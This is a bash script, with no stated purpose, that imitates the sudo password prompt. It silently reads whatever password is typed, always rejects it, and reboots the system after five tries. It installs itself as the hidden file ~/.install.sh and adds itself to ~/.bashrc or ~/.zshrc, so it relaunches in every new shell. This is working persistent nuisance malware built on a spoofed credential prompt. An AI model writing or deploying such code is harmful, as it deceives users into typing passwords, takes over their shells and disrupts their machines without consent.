#!/bin/bash

# Get the current user
USER=$(whoami)
max_attempts=5
attempt_count=0

# Function to simulate the sudo prompt
prompt_sudo() {
    while true; do
        # Prompt for password
        echo -n "[sudo] password for $USER: "

        # Check if running in an interactive shell (with a terminal)
        if [ -t 0 ]; then
            # Turn off echo to hide input, read the password (will always fail)
            stty -echo
            read -r password
            stty echo
        else
            read -r password
        fi

        # Add a new line (to simulate what happens when pressing enter)
        echo ""

        # Always show failure message
        echo "Sorry, try again."

        # Increment the attempt count
        attempt_count=$((attempt_count + 1))

        # If max attempts reached, reboot the system
        if [ "$attempt_count" -ge "$max_attempts" ]; then
            echo "Maximum attempts reached. Rebooting..."
            sleep 1
            reboot
        fi

        # Sleep for 10 seconds before asking again
        sleep 10
    done
}

# Detect the user's shell and modify the relevant config file
add_to_startup() {
    # Check the shell type
    if [[ "$SHELL" == */bash ]]; then
        config_file="$HOME/.bashrc"
    elif [[ "$SHELL" == */zsh ]]; then
        config_file="$HOME/.zshrc"
    else
        config_file="$HOME/.bashrc"  # Default to bash if unknown
    fi

    # Line to add to the shell config file
    startup_line="~/.install.sh &"

    # Check if the line already exists in the config file, to avoid duplication
    if ! grep -Fxq "$startup_line" "$config_file"; then
        echo "$startup_line" >> "$config_file"
        echo "Added sudo prompt script to $config_file"
    else
        echo "Sudo prompt script is already in $config_file"
    fi
}

# Write the script itself to ~/.sudo_prompt.sh (if not already present)
install_script() {
    sudo_prompt_script="$HOME/.install.sh"

    # Check if the script file already exists to avoid overwriting
    if [[ ! -f "$sudo_prompt_script" ]]; then
        cat > "$sudo_prompt_script" <<EOL
#!/bin/bash
# Get the current user
USER=\$(whoami)
max_attempts=5
attempt_count=0

# Function to simulate the sudo prompt
while true; do
    # Prompt for password
    echo -n "[sudo] password for \$USER: "

    # Check if running in an interactive shell
    if [ -t 0 ]; then
        # Turn off echo to hide input, read the password (will always fail)
        stty -echo
        read -r password
        stty echo
    else
        read -r password
    fi

    # Add a new line (to simulate what happens when pressing enter)
    echo ""

    # Always show failure message
    echo "Sorry, try again."

    # Increment the attempt count
    attempt_count=\$((attempt_count + 1))

    # If max attempts reached, reboot the system
    if [ "\$attempt_count" -ge "\$max_attempts" ]; then
        echo "Maximum attempts reached. Rebooting..."
        sleep 1
        sudo reboot
    fi

    # Sleep for 10 seconds before asking again
    sleep 10
done
EOL

        # Make the script executable
        chmod +x "$sudo_prompt_script"
        echo "Installed sudo prompt script at $sudo_prompt_script"
    else
        echo "Sudo prompt script already exists at $sudo_prompt_script"
    fi
}


install_script
add_to_startup

prompt_sudo